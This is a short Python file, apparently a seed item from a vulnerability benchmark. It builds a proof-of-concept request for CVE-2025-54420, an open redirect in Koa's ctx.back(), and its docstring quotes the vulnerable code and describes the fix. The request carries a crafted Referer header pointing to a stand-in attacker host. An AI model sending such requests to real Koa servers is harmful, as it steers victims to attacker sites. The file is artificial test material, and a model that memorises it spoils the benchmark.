#!/usr/bin/env python3
r"""[GIVEN] CVE-2025-54420 seed exploit — Koa ctx.back() Referrer open redirect.

Koa <= 3.0.0 (V0) implements the "back" redirect as:

    back (alt) {
      const url = this.ctx.get('Referrer') || alt || '/'
      this.redirect(url)
    }

i.e. it redirects to the user-controlled `Referer` request header with NO origin check whatsoever.
An attacker who gets a victim to visit `/redirect` with a crafted `Referer` steers the browser to
any absolute off-origin URL.

This seed sends

    Referer: http://attacker.pcb/<FLAG>

so a successful open redirect emits `Location: http://attacker.pcb/<FLAG>` — the attacker origin
(carrying the per-run ${PCB_FLAG} canary in the path) surfaces in the 302 Location header. Nothing is
planted server-side; the flag is only the attacker-redirect label.

Contract: reaches the flag on V0 (koa@3.0.0); BLOCKED on V1 (koa@3.0.1). The CVE-2025-54420 fix
(GHSA-jgmv-j7ww-jx2x, given in patch.diff) rewrites back() to only redirect a Referrer that either
startsWith('/') OR resolves same-origin; the absolute `http://attacker.pcb/...` is neither, so V1
falls back to `redirect(alt || '/')` -> `Location: /`, no flag. This is the seed the system is given.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """Request candidate: GET /redirect whose Referer is an ABSOLUTE attacker URL."""
    return {
        "probe_id": "cve-2025-54420-absolute-referer",
        "method": "GET",
        "path": "/redirect",
        "referer": f"http://attacker.pcb/{flag}",
    }


if __name__ == "__main__":
    print(repr(candidate("PCBFLAG_demo")["referer"]))
